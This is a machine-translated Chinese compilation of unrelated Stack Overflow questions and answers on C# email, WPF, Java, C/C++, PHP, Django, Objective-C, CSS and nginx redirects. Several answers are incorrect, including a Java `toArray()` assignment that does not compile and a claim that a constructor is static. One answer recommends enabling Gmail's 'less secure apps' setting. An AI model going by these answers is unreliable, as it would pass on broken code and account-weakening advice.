我在“电子邮件确认”、“密码恢复”和“发送电子邮件”方面遇到了问题，现在所有 3 个问题都已解决 :)。

我知道这是一篇很老的帖子，但我通常使用现有帖子来寻找答案，而不是提出新问题。

谢谢大家的帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-03-21T18:14:48.400

正如我已经[在这里](https://stackoverflow.com/questions/19932981/smtp-gmail-timing-out/27990543#27990543)回答的那样。

此问题也可能是由您的 gmail 帐户中的安全配置引起的。

正确的端口是 587，但要进行身份验证，您需要允许来自您 gmail 帐户中安全性较低的应用程序的访问。[在这里](https://www.google.com/settings/security/lesssecureapps)试试

它对我有用，希望它有帮助..

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-12-15T13:05:45.873

asp.net web forms/sharepoint中的示例

```
StringBuilder Body = new StringBuilder();
Body.Append("Your text");

String FromEmail = "you email";
String DisplayNameFromEmailMedico = "display when you receive email";
MailMessage message = new MailMessage();
message.From = new MailAddress(FromEmail, DisplayNameFromEmailMedico);
message.To.Add(new MailAddress("myclient@gmail.com"));
message.Subject = "subject that print in email";
message.IsBodyHtml = true;
message.Body = Body.ToString();
SmtpClient client = new SmtpClient();

NetworkCredential myCreds = new NetworkCredential("yoursmtpemail@gmail.com", "key from email smtp", "");
client.EnableSsl = true;
client.Credentials = myCreds;
client.Send(message); 
```

# c# - Touch DragDrop - 阻止所有输入更改

> ID：15555390
> 
> 赞同：2
> 
> 时间：2013-03-21T18:31:51.717
> 
> 标签：c#, .net, wpf, drag-and-drop, touch

我正在尝试使用`DragDrop.DoDragDrop`. 正如我在[这篇文章](https://stackoverflow.com/questions/13401768/touch-dragdrop-in-wpf)中所读到的（我也不能为此使用表面拖动框架），我还必须实现 a `QueryContinueDragHandler`，我有以下实现：

（在主窗口构造函数中）

```
this.QueryContinueDrag += (obj, e) => 
{
    if(_touchDevice.IsActive)
        e.Action = DragAction.Continue;
    else
        e.Action = DragAction.Drop;
}; 
```

（在一些 TouchDown 事件处理程序上）

```
Object data = new Object();
_touchDevice = e.TouchDevice;
DragDrop.DoDragDrop(this, data, DragDropEffects.Link); 
```

然而，随着这个拖动动作永远不会结束，这`_touchDevice.IsActive`将永远是真的，无论 TouchDevice 实际上是否仍然“触摸”。 [这个问题也](https://stackoverflow.com/questions/3467200/using-system-windows-dragdrop-dodragdrop-with-touch-events)和我的有关，但是我觉得答案不理想，不想把线程变成僵尸。

如何检测 TouchDevice 何时/是否处于非活动状态？

# java - 将双精度数组列表转换为双精度数组

> ID：15555391
> 
> 赞同：-2
> 
> 时间：2013-03-21T18:31:56.277
> 
> 标签：java, arrays, arraylist

我想将我的双 ArrayList 转换为双数组，但我不确定如何。这是我当前的代码清单：

```
ArrayList<Double> aL= new ArrayList<Double>();  
double x[] = new double[aL.size()];
aL.add(10.0);  
aL.add(5.0);  
aL.add(2.0);
for(int i =0; i < x.length; i++){
//some code
} 
```

但是后来我不知道该去哪里，我无法在互联网/书中找到任何东西来给我任何见解。谢谢。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-03-21T18:32:56.380

您可以使用 Collection API 将列表转换为数组。试试 uL.toArray();

* * *

## 回答 #2

> 赞同：-4
> 
> 时间：2013-03-21T18:38:38.033

首先，您需要创建 ArrayList。然后你需要创建你的数组。

```
List<Double> aL= new ArrayList<Double>();  
aL.add(10.0D);  
aL.add(5.0D);  
aL.add(2.0D);

double x[] = new double[aL.size()];
for(int i = 0; i < x.length; i++){
     x[i] = al.get(i);
} 
```

您可以使用 ArrayList 方法将 ArrayList 复制到数组中。

```
List<Double> aL= new ArrayList<Double>();  
aL.add(10.0D);  
aL.add(5.0D);  
aL.add(2.0D);

double x[] = aL.toArray(); 
```

# matlab - 如何在matlab中使用'或'在两个值之间进行选择？

> ID：15555399
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:32:17.503
> 
> 标签：matlab, find, logic, cell

我有以下代码：

```
a = cell(4,1);
a{1} = [5 3 0 0];
a{2} = [0 3 5 0];
a{3} = [1 3 0 0];
a{4} = [0 3 2 0];

arrayind = 2;

b = a(cellfun(@(x)x(arrayind) == 1,a));
b{:} 
```

使用 IF 语句时如何实现这一点：

```
if r>2
b = a(cellfun(@(x)x(arrayind) == (1 | 2 | 3),a));
end 
```

基本上说，找到1，如果没有那么2，如果没有那么3......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:47:40.630

`ismember`可能是您正在寻找的东西。将相等运算符替换`ismember`为如下：

```
a = cell(4,1);
a{1} = [5 3 0 0];
a{2} = [0 3 5 0];
a{3} = [1 3 0 0];
a{4} = [0 3 2 0];
arrayind = 1;
b = a(cellfun(@(x) ismember(x(arrayind), [1 5]), a)); 
```

会产生`b = a([1, 3])`

# wpf - WPF XML 数据绑定不起作用

> ID：15555400
> 
> 赞同：0
> 
> 时间：2013-03-21T18:32:17.717
> 
> 标签：wpf, xaml, data-binding

我有以下 xml 文件。我已将其复制到我的项目调试/bin 文件夹中，并且还附加到我的项目中。

```
<?xml version="1.0" standalone="yes" ?> 
- <NorthwindDataSet xmlns="http://tempuri.org/NorthwindDataSet.xsd">
- <Customers>
  <CustomerID>ALFKI</CustomerID> 
  <CompanyName>Alfreds Futterkiste</CompanyName> 
  <ContactName>Maria Anders</ContactName> 
  <ContactTitle>Sales Representative</ContactTitle> 
  <Address>Obere Str. 57</Address> 
  <City>Berlin</City> 
  <PostalCode>12209</PostalCode> 
  <Country>Germany</Country> 
  <Phone>030-0074321</Phone> 
  <Fax>030-0076545</Fax> 
  </Customers>
- <Customers>
  <CustomerID>ANATR</CustomerID> 
  <CompanyName>Ana Trujillo Emparedados y helados</CompanyName> 
  <ContactName>Ana Trujillo</ContactName> 
  <ContactTitle>Owner</ContactTitle> 
  <Address>Avda. de la Constitución 2222</Address> 
  <City>México D.F.</City> 
  <PostalCode>05021</PostalCode> 
  <Country>Mexico</Country> 
  <Phone>(5) 555-4729</Phone> 
  <Fax>(5) 555-3745</Fax> 
  </Customers>
</NorthwindDataSet> 
```

我想在我的 WPF 应用程序中绑定诸如 CustomerName、City 之类的属性。我尝试如下在 XAML 中绑定它，但没有成功。需要建议，我做错了什么。

```
<Window.Resources>
        <XmlDataProvider x:Key="NorthData" Source="Northwind.xml" XPath="/Customers"/>
    </Window.Resources>
    <Grid>
        <Label Content="{Binding XPath=Address,FallbackValue=BindingFailed,Source={StaticResource NorthData}}" Height="28" HorizontalAlignment="Left" Margin="118,94,0,0" Name="label1" VerticalAlignment="Top" Width="127" />
        <ListBox ItemsSource="{Binding Source={StaticResource NorthData},XPath=City,FallbackValue=BindingFailed}" Height="100" HorizontalAlignment="Left" Margin="128,144,0,0" Name="listBox1" VerticalAlignment="Top" Width="120" />
    </Grid> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:58:32.243

使用您的代码，我稍微修改了 XPath，并删除了对您未提供的 XSD 的引用，并且它起作用了：

```
<Window x:Class="WpfApplication1.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="350" Width="525">
    <Window.Resources>
        <XmlDataProvider x:Key="NorthData" XPath="NorthwindDataSet/Customers">
            <x:XData>
                <NorthwindDataSet xmlns="">
                    <Customers>
                        <CustomerID>ALFKI</CustomerID>
                        <CompanyName>Alfreds Futterkiste</CompanyName>
                        <ContactName>Maria Anders</ContactName>
                        <ContactTitle>Sales Representative</ContactTitle>
                        <Address>Obere Str. 57</Address>
                        <City>Berlin</City>
                        <PostalCode>12209</PostalCode>
                        <Country>Germany</Country>
                        <Phone>030-0074321</Phone>
                        <Fax>030-0076545</Fax>
                    </Customers>
                    <Customers>
                        <CustomerID>ANATR</CustomerID>
                        <CompanyName>Ana Trujillo Emparedados y helados</CompanyName>
                        <ContactName>Ana Trujillo</ContactName>
                        <ContactTitle>Owner</ContactTitle>
                        <Address>Avda. de la Constitucion 2222</Address>
                        <City>Mexico D.F.</City>
                        <PostalCode>05021</PostalCode>
                        <Country>Mexico</Country>
                        <Phone>(5) 555-4729</Phone>
                        <Fax>(5) 555-3745</Fax>
                    </Customers>
                </NorthwindDataSet>
            </x:XData>
        </XmlDataProvider>
    </Window.Resources>
    <Grid>
        <Label Content="{Binding XPath=Address
            , FallbackValue=BindingFailed
            , Source={StaticResource NorthData}}" 
               Height="28"
               HorizontalAlignment="Left" 
               Margin="118,94,0,0" Name="label1" 
               VerticalAlignment="Top" Width="127" />
        <ListBox ItemsSource="{Binding Source={StaticResource NorthData}
            , XPath=City
            , FallbackValue=BindingFailed}" 
                 Height="100" 
                 HorizontalAlignment="Left" 
                 Margin="128,144,0,0" 
                 Name="listBox1" 
                 VerticalAlignment="Top" 
                 Width="120" />
    </Grid>
</Window> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:35:58.743

您必须将 DataContext 设置为您的 XML

```
<Window.Resources>
        <XmlDataProvider x:Key="NorthData" Source="Northwind.xml" XPath="/Customers"/>
    </Window.Resources>
    <Grid DataContext="{StaticResource NorthData}">
        <Label Content="{Binding XPath=Address,FallbackValue=BindingFailed,Source={StaticResource NorthData}}" Height="28" HorizontalAlignment="Left" Margin="118,94,0,0" Name="label1" VerticalAlignment="Top" Width="127" />
        <ListBox ItemsSource="{Binding Source={StaticResource NorthData},XPath=City,FallbackValue=BindingFailed}" Height="100" HorizontalAlignment="Left" Margin="128,144,0,0" Name="listBox1" VerticalAlignment="Top" Width="120" />
    </Grid> 
```

# java - 调用方法不起作用

> ID：15555402
> 
> 赞同：0
> 
> 时间：2013-03-21T18:32:30.850
> 
> 标签：java, methods

所以我得到了

```
public static void main(String[] args) {

    System.out.println("Trying to open lock"); 
    System.out.println("Trying ");
    ComboLock numbers = new ComboLock();
    int number1 = numbers.ComboLock;
    ` 
```

我试图从这个类中调用 ComboLock

```
public class ComboLock {

private int number1, number2, number3;
private boolean locked;
public static final int SMALLEST_NUMBER = 1;
public static final int LARGEST_NUMBER = 39;

public ComboLock() {
    locked = true;
    Random rand = new Random();
    number1 = rand.nextInt(LARGEST_NUMBER - SMALLEST_NUMBER) + SMALLEST_NUMBER;
    number2 = rand.nextInt(LARGEST_NUMBER - SMALLEST_NUMBER) + SMALLEST_NUMBER;
    number3 = rand.nextInt(LARGEST_NUMBER - SMALLEST_NUMBER) + SMALLEST_NUMBER;
} 
```

我在尝试制作 number1.ComboLock(); 时遇到错误 说它找不到符号

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:34:20.553

```
public ComboLock() { 
```

是一个构造函数，并且您正尝试将其作为函数/方法访问

```
int number1 = numbers.ComboLock; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:34:46.637

当您调用 时`ComboLock numbers = new ComboLock();`，它实际上调用了您创建的 ComboLock() 函数。它被称为构造函数，它只适用于与类同名的函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:35:15.943

```
public ComboLock() { 
```

是构造函数并且是静态的，您不能使用对象调用它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T18:35:23.420

您正在尝试调用构造函数，而不是方法。作为构造函数，它不返回值，因此在某处分配它的返回值是没有意义的。

```
public class ComboLock {

    private int number1, number2, number3;
    private boolean locked;
    public static final int SMALLEST_NUMBER = 1;
    public static final int LARGEST_NUMBER = 39;

    public ComboLock() {
        locked = true;
        Random rand = new Random();
        number1 = rand.nextInt(LARGEST_NUMBER - SMALLEST_NUMBER) + SMALLEST_NUMBER;
        number2 = rand.nextInt(LARGEST_NUMBER - SMALLEST_NUMBER) + SMALLEST_NUMBER;
        number3 = rand.nextInt(LARGEST_NUMBER - SMALLEST_NUMBER) + SMALLEST_NUMBER;
    }
    public int getNumber1() {
        return number1;
    }
} 
```

像这样称呼它：

```
ComboLock numbers = new ComboLock();
int number1 = numbers.getNumber1(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-21T18:35:53.593

我认为您打算这样做：

```
int number1 = numbers.number1; 
```

...这无论如何都行不通，因为该`number1`字段是私有的。

# c++ - 如何比较格式为“Month Date hh:mm:ss”的两个时间戳以检查 +ve 或 -ve 值

> ID：15555406
> 
> 赞同：4
> 
> 时间：2013-03-21T18:32:47.357
> 
> 标签：c++, c, time, comparison

我检查了stackoverflow网站的答案，我没有得到，所以我在这里发布。

我的问题是：

> 如何比较两个时间戳的格式`"Month Date hh:mm:ss"`？

我正在用 C 和 C++ 编写程序，时间是可显示的字符串格式。

例子 ：

```
time1 = "Mar 21 11:51:20"
time2 = "Mar 21 10:20:05" 
```

我想比较 time1 和 tme2 并找出是否`time2`在*之后* `time1`，我需要输出为`true`or `false`，如下所示：

```
 if time2 > time1 then 
       i need output as 1 
 or 
       0 or -1 anything 
```

我用过`difftime(time2,time1)`，但它返回和之间的增量`diff`时间。 我想检查更大与否。 `time1``time2`

如需任何帮助，请提前致谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T19:29:19.890

**FIRST-** 使用 difftime 进行比较：

您可以简单地使用[`difftime()`](http://www.cplusplus.com/reference/ctime/difftime/)函数来比较时间和返回`1`或 `-1`如下：

```
int comparetime(time_t time1,time_t time2){
 return difftime(time1,time2) > 0.0 ? 1 : -1; 
} 
```

**SECOND-** 将字符串转换为时间：

如果**转换** `string` **成** `time_t`struct有困难，可以依次使用两个函数：

1.  [`char *strptime(const char *buf, const char *format, struct tm *tm);`](http://pic.dhe.ibm.com/infocenter/iseries/v7r1m0/index.jsp?topic=/rtref/strpti.htm)功能。将字符串转换为`struct tm`

    示例：要将日期时间字符串`"Mar 21 11:51:20 AM"`转换为`struct tm`您需要三个格式字符串：

    > **%b**：月份名称，可以是全名或缩写
    > **%d**：月份 [1-31]。
    > **%r** : 区域设置的 AM/PM 格式的时间。如果在 locale 时间格式中不可用，则默认为 POSIX 时间 AM/PM 格式：`%I:%M:%S %p`.

2.  [`time_t mktime (struct tm * timeptr);`](http://www.cplusplus.com/reference/ctime/mktime/)转换`struct tm*`为的函数`time_t`

下面是我的示例程序：

```
#include <stdio.h>
#include <time.h>
int main(void){
    time_t t1, t2;
    struct tm *timeptr,tm1, tm2;
    char* time1 = "Mar 21 11:51:20 AM";
    char* time2 = "Mar 21 10:20:05 AM";

    //(1) convert `String to tm`:  
    if(strptime(time1, "%b %d %r",&tm1) == NULL)
            printf("\nstrptime failed\n");          
    if(strptime(time2, "%b %d %r",&tm2) == NULL)
            printf("\nstrptime failed\n");

    //(2)   convert `tm to time_t`:    
    t1 = mktime(&tm1);
    t2 = mktime(&tm2);  

     printf("\n t1 > t2 : %d", comparetime(t1, t2));
     printf("\n t2 > t1 : %d", comparetime(t2, t1));
     printf("\n");
     return 1;
} 
```

它可以按您的意愿工作：

```
 $ ./a.out 
 t1 > t2 : 1
 t2 > t1 : -1 
```

要计算两个日期之间的差异，请阅读：[如何在 C 中找到两个日期之间的差异（以小时为单位）？](https://stackoverflow.com/questions/21862808/how-do-you-find-the-difference-between-two-dates-in-hours-in-c/21864664#21864664)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T19:37:39.003

看着`strptime()`

它将格式化日期/时间的 ASCII 字符串转换为`struct tm`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-11T21:40:37.503

这是解决您的问题的一种非常简单的方法。如果在您的情况下，比较取决于时间。如果是这样，您可以将时间变量转换为字符串，以便将它们作为字符串进行比较。仅当比较的基础是小时、分钟和秒元素和/或天时。它看起来像这样：

```
string time1 = "Mar 21 11:51:20";
string time2 = "Mar 21 10:20:05";

cout<<time1<< endl;
cout<<time2<< endl;
cout<<endl;

if(time1>time2)cout<<time1<< endl;
else cout << time2 << endl; 
```

# c++ - 如何使用 boost 复制成员访问权限

> ID：15555414
> 
> 赞同：2
> 
> 时间：2013-03-21T18:33:08.423
> 
> 标签：c++, boost, binding, boost-bind, boost-iterators

我有一个 As with 的容器

```
struct A { int f(); } 
```

容器提供了迭代器，我们可以在这个例子中假设它是一个 std::vector。所以：

```
std::vector<A> As; 
```

现在我想将 A::f 提供的值复制到第二个容器中

```
std::vector<int> fs; 
```

尽管我可以简单地进行迭代，但作为练习，我尝试使用 boost bind / boost 迭代器来解决这个问题。到目前为止，我尝试的是：

```
std::copy(
     boost::make_transform_iterator
         (As.begin(), boost::bind(&A::f, _1)),
     boost::make_transform_iterator
         (As.begin(), boost::bind(&A::f, _1)),
     std::back_inserter( fs )
); 
```

任何人都知道如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:42:13.297

如果我将第二个 make_transform 迭代器更改为指向 end() 而不是 begin()，那么一切似乎都正常。

```
#include <boost/iterator/transform_iterator.hpp>
#include <boost/bind.hpp>
#include <iostream>
#include <vector>

struct A {
    int f() {
        static int x = 0;
        return x++;
    };
};

int main() {
    std::vector<A> As;
    As.push_back(A());
    As.push_back(A());
    As.push_back(A());

    std::vector<int> fs;

    std::copy(
            boost::make_transform_iterator(As.begin(), boost::bind(&A::f, _1)),
            boost::make_transform_iterator(As.end(),   boost::bind(&A::f, _1)),
            std::back_inserter(fs)
            );

    for (int const & x : fs)
        std::cout << x << std::endl;
} 
```

## 输出

```
0
1
2 
```

## 替代解决方案

你也可以用仿函数解决这个问题：

```
struct Functor {
    int operator()(A & value) const {
        return value.f();
    }
};

std::transform(As.begin(), As.end(), std::back_inserter(fs), Functor()); 
```

或使用 lambda：

```
std::transform(As.begin(), As.end(), std::back_inserter(fs), [](A & a) { return a.f(); }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:39:49.897

您希望传递给的类函数对象`make_transform_iterator`获取 an`A`并返回调用`f`that的结果`A`。虽然您可以像使用 一样执行此操作`bind`，但您可以使用 更明确地执行此操作`std::mem_fn`：

```
std::copy(
  boost::make_transform_iterator
    (As.begin(), std::mem_fn(&A::f)),
  boost::make_transform_iterator
    (As.end(), std::mem_fn(&A::f)),
  std::back_inserter( fs )
); 
```

请注意，第二个变换迭代器应该适应`As.end()`。

# php - 无法通过引用重载对象进行分配

> ID：15555418
> 
> 赞同：1
> 
> 时间：2013-03-21T18:33:19.280
> 
> 标签：php, wordpress, object, overloading

这是我的 wordpress 主题的一部分，它给了我最后一行代码的错误。我在 PHP 5.4 上运行 wordpress 3.5.1

```
Fatal error: Cannot assign by reference to overloaded object in C:\server\htdocs\web\digitalnak\wp-content\themes\rework\framework\php\PeTheme\PeThemeGallery.php on line 234 
```

这是代码

```
 $post =& get_post($id);
    if (!$post ) return $post;
    $null = null;
    if ($post->post_type != "gallery") return $null;

    $meta =& $this->master->meta->get($id,$post->post_type);
    $post->meta =& $meta; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T16:00:14.687

没有看过任何东西——因此这可能根本不起作用——试试这个：

```
$post =& get_post($id);
if (!$post ) return $post;

$null = null;
if ($post->post_type != "gallery") return $null;

$meta =& $this->master->meta->get($id,$post->post_type);
$post->meta = $meta; 
```

看起来您正在通过引用 ArrayAccess 对象来分配值。这在某些版本的 PHP 中不起作用。我无法判断这一点，但看起来这段代码似乎非常大量地使用了传递引用，可能超出了必要的范围。

# profiling - 内存访问分析

> ID：15555419
> 
> 赞同：1
> 
> 时间：2013-03-21T18:33:23.843
> 
> 标签：profiling, memory-profiling

我想知道应用程序按访问顺序访问了哪些地址。我听说可以使用 Pin（来自 Intel 的分析器）来执行此操作。

有没有办法用 Pin 或其他一些工具来做到这一点？

该应用程序很可能是用 C 编写的。我正在使用 Linux Mint 14。

注意：视觉结果会很好，但不是必需的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T18:33:38.820

看来Pin毕竟可以做到这一点。有一个名为“pinatrace”的示例工具，它跟踪所有内存访问地址，无论是读取还是写入等。这不是视觉结果。它将所有访问信息写入文本文件。它可能是一个巨大的文件，具体取决于程序的内存占用和使用情况。

但是可以通过更改 pin 工具（pinatrace）代码中的注入代码来过滤这些，以防您只想知道特定数组或其他东西的访问顺序（这是我的情况）。

希望这可以帮助任何面临类似问题的人。

# javascript - 如何在流体布局中制作可调整大小的滚动文本框？

> ID：15555420
> 
> 赞同：0
> 
> 时间：2013-03-21T18:33:26.227
> 
> 标签：javascript, scrollbar, fluid-layout

我尝试过使用 Dreamweaver 的标准流体布局，并在桌面设计上将其修改为 10% 的列宽和 24 列。我尝试在 div 中创建一个 div（请耐心等待，我是 Dreamweaver 的菜鸟），并将文本框的约束设置在外部 div 内，但无法想出一个在这方面的解决方案。

我试图设置文本框本身的参数，但由于 % v. px 的冲突，这也不起作用。在流体布局中，我使用 % 来调整大小。

本质上，问题在于能够将文本框上的垂直约束设置为与屏幕尺寸变化成比例；水平很好，因为我可以在 Dreamweaver 的设计模块中设置宽度约束。

我在想我必须通过某种 javascript 来设置它；尽管除了从构建它的人那里提取代码并将其插入站点之外，我对 java 一无所知。

很抱歉这篇文章的漫无边际，我希望它是有道理的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-30T09:32:48.303

我正在帮助您解决有关 jQuery 的其他问题，我决定四处窥探并找到了这个问题。我了解您希望列中的文本框具有流体高度。可以这样实现：

CSS：

```
/* 
   In order to use width/height: 100% on the body and html
   You need to remove the margins and padding on them, otherwise
   you'll see a vertical and horizontal scroll bar, which is awful.
   This way, it removed margins and paddings on everything, ultimately
   leading to better styling overall. 
*/

*
{
    margin: 0;
    padding: 0;
}

body, html
{
    width: 100%;
    height: 100%;
}

/* Create a wrapper to base all other %-based measurements off of. */
#wrapper
{
    width: 100%;
    height: 100%;
}

/* The column that the textbox will be inside */
#someColumn
{
    width: 50%;
    height: 50%;
    margin: 5px;
    padding: 5px;
}

#someColumn textarea
{
    width: 25%;
    height: 50%;
    /* The textbox will now be 50% the height of #someColumn */
} 
```

HTML：

```
<body>
    <div id="wrapper">
        <div id="someColumn">
            <textarea></textarea>
        </div>
    </div>
</body> 
```

[这是一个 jsFiddle 看看它的样子](http://jsfiddle.net/Ntf49/)

# python - 创建用户帐户后模板的奇怪行为

> ID：15555426
> 
> 赞同：0
> 
> 时间：2013-03-21T18:33:34.687
> 
> 标签：python, html, django

因此，我有一个索引页面，用于检查用户是否已通过身份验证，如果已通过身份验证，则将其重定向到`workouts.html`页面：

```
def index(request, auth_form=None, user_form=None):
    if request.user.is_authenticated():
        user = request.user
        context = {'user': user}
        template = 'workouts.html'
        return render(request, template, context)
    else:
        auth_form = auth_form or AuthenticateForm()
        user_form = user_form or UserCreateForm()
        template = 'index.html'
        context = {'auth_form': auth_form, 'user_form': user_form}
        return render(request, template, context) 
```

还有登录/身份验证视图，但所有这些都很好。我遇到的问题是我编写了一个非常基本的模板页面`workouts.html`来测试经过身份验证的用户重定向：

```
<!DOCTYPE html>
<html>
    <head></head>
    <body>
        <div>These are your workouts, {{ user.username }}.</div>
    </body>
</html> 
```

我使用测试帐户登录。一切正常。但是，现在当我尝试添加额外的 html 时，例如注销表单：

```
<form action="/logout">
    <input type="submit" value="Log Out" />
</form> 
```

除了我已经呈现的 HTML 之外，什么都没有显示。我已经尝试重新启动服务器以达到相同的效果。我还尝试添加一些更简单的东西，比如

```
<div>wtf</div> 
```

除了初始消息外，什么都没有显示。如果我删除页面上的所有内容，我仍然会收到`"These are your workouts, test1"`消息。即使我手动注销用户，我也会收到相同的初始消息。当所有其他行为（表单身份验证、初始呈现、url 路由等）似乎工作正常时，为什么模板引擎没有注册我的新更改？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:56:28.673

大胆猜测，您应该关闭它：

```
 <input type="submit" value="Log Out" 
```

它看起来像这样：

```
 <input type="submit" value="Log Out" /> 
```

可能的原因：在输入关闭之前，浏览器将所有内容解释为“输入标签内”的一部分，因为它从未关闭，所以它永远不会呈现。

无论如何：确保您的 HTML 有效。

# iphone - 目标 c - 如何将 nsdata 转换为字节数组

> ID：15555427
> 
> 赞同：4
> 
> 时间：2013-03-21T18:33:35.847
> 
> 标签：iphone, objective-c, bytearray

我正在将 UIImage 转换为 NSData。我想将 NsData 转换为字节数组，并在 json Parser 的帮助下将该字节数组发布到服务器。

如果我将以下类型的静态字符串传递给服务器，它接受并存储。以下只是示例字符串语法。我想要以下类型的字节数组将数据发布到服务器。

[255,216,255,224,0,16,74,70,73,70,0,1,1,1,0,96,0,96,0,0,255,219,0,67,0,8,6,6,7,6 ,5,8,7,7,7,9,9,8,10,12,...]

对于上述结果，我将图像转换为数据，如下所示：

```
UIImage *image = [UIImage imageNamed:@"image.png"];
NSData *data = UIImagePNGRepresentation(image); 
```

现在我想将 NSdata 转换为字节数组，因为我正在使用以下代码：

```
NSUInteger len = [data length];
Byte *byteData = (Byte*)malloc(len);
memcpy(byteData, [data bytes], len);
free(byteData) 
```

我也将它存储到 NSdata。但无法得到结果。我还输入了带有循环的代码，但每次它都会给出**aPNG**作为结果。

我在上面的代码中做错了吗？

请为我提供一些帮助，并要求为此提供任何帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-21T20:21:42.363

我不是 100% 确定这是否是您正在寻找的东西。尝试：

```
UIImage *image = [UIImage imageNamed:@"image.png"];
NSData *data = UIImagePNGRepresentation(image);
NSUInteger len = data.length;
uint8_t *bytes = (uint8_t *)[data bytes];
NSMutableString *result = [NSMutableString stringWithCapacity:len * 3];
[result appendString:@"["];
for (NSUInteger i = 0; i < len; i++) {
    if (i) {
        [result appendString:@","];
    }
    [result appendFormat:@"%d", bytes[i]];
}
[result appendString:@"]"]; 
```

这是你需要的吗？

# url - 如果没有斜杠，Nginx 会导致 301 重定向

> ID：15555428
> 
> 赞同：85
> 
> 时间：2013-03-21T18:33:46.207
> 
> 标签：url, redirect, nginx

我在使用 NAT 的虚拟机中运行 nginx，当我从主机访问它时遇到重定向问题。

### 按预期工作

*   `http://localhost:8080/test/index.htm`: 有效。
*   `http://localhost:8080/test/`: 有效。

### 没有按预期工作

*   `http://localhost:8080/test`: 重定向到`http://localhost/test/`. 这***不是***我想要的。**（注意它会去除端口号）**

### 我试过的

根据我在谷歌上搜索的内容，我尝试了`server_name_in_redirect off;`and `rewrite ^([^.]*[^/])$ $1/ permanent;`，但都没有成功。

### 我的默认.conf：

```
server {
    listen       80;
    server_name  localhost;
    # server_name_in_redirect off;

    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm index.php;
    }

    location ~ \.php$ {
    # rewrite ^([^.]*[^/])$ $1/ permanent;
        root           /usr/share/nginx/html;
        try_files      $uri =404;
        #fastcgi_pass   127.0.0.1:9000;
        fastcgi_pass   unix:/tmp/php5-fpm.sock;
        fastcgi_index  index.php;
        include        fastcgi_params;
    }

    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

} 
```

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2015-07-02T16:25:20.767

[我在serverfault](https://serverfault.com/a/703184/12110)上发布了这个问题的可能解决方案；为方便起见，在此转载：

如果我正确理解了这个问题，您希望在不使用 301 重定向的情况下自动提供[http://example.com/foo/index.html](http://example.com/foo/index.html)，而请求是针对[http://example.com/foo](http://example.com/foo)且没有斜杠?

### 适合我的基本解决方案

> 如果是这样，我发现这个 try_files 配置可以工作：
> 
> ```
> try_files $uri $uri/index.html $uri/ =404; 
> ```
> 
> *   第一个`$uri`完全匹配 uri
> *   第二个`$uri/index.html`匹配包含 index.html 的目录，其中路径的最后一个元素与目录名称匹配，没有尾部斜杠
> *   第三个`$uri/`匹配目录
> *   `=404`如果前面的模式都不匹配，第四个返回 404 错误页面。

取自[Serverfault 答案](https://serverfault.com/a/703184/175181)

### 我的更新版本

如果您在`server`块中添加：

```
index index.html index.htm; 
```

并修改`try_files`为如下所示：

```
try_files $uri $uri/ =404; 
```

它也应该工作。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2018-04-03T20:29:40.790

一个对我有用的更简单的解决方案是禁用绝对重定向，`absolute_redirect off;`如下例所示：

```
server {
    listen 80;
    server_name  localhost;
    absolute_redirect off;

    location /foo/ {
        proxy_pass http://bar/;
    } 
```

如果我在 on 上运行 curl `http://localhost:8080/foo`，我可以看到`Location`重定向 HTTP 响应中的标头是 as`/foo/`而不是`http://localhost/foo/`。

```
$ curl -I http://localhost:8080/foo
HTTP/1.1 301 Moved Permanently
Server: nginx/1.13.8
Date: Tue, 03 Apr 2018 20:13:28 GMT
Content-Type: text/html
Content-Length: 185
Connection: keep-alive
Location: /foo/ 
```

由此，我认为任何网络浏览器都会对相对位置做正确的事情。在 Chrome 上测试，它工作正常。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2014-05-25T19:15:31.823

尝试 ：

```
server {
    listen       80;
    server_name  localhost;
    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm index.php;
        if (-d $request_filename) {
            rewrite [^/]$ $scheme://$http_host$uri/ permanent;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2014-05-02T15:53:30.510

尝试改变

```
server_name  localhost;
# server_name_in_redirect off; 
```

至

```
server_name  localhost:8080;
server_name_in_redirect on; 
```

# sparql - SPARQL - 获取一个国家/地区的地点列表

> ID：15555430
> 
> 赞同：1
> 
> 时间：2013-03-21T18:33:49.993
> 
> 标签：sparql, dbpedia

我是 SPARQL 的新手，希望在我的学习中得到一些帮助。我想获得我国几个地方（社区、城市、州、地区、河流、纪念碑......）的纬度和经度：巴西。

我试过：

```
PREFIX geo: <http://www.w3.org/2003/01/geo/wgs84_pos#>
PREFIX dbo: <http://dbpedia.org/ontology/>
SELECT *
WHERE  { 
    ?s a dbo:Place .
    ?s geo:lat ?lat .
    ?s geo:long ?long .
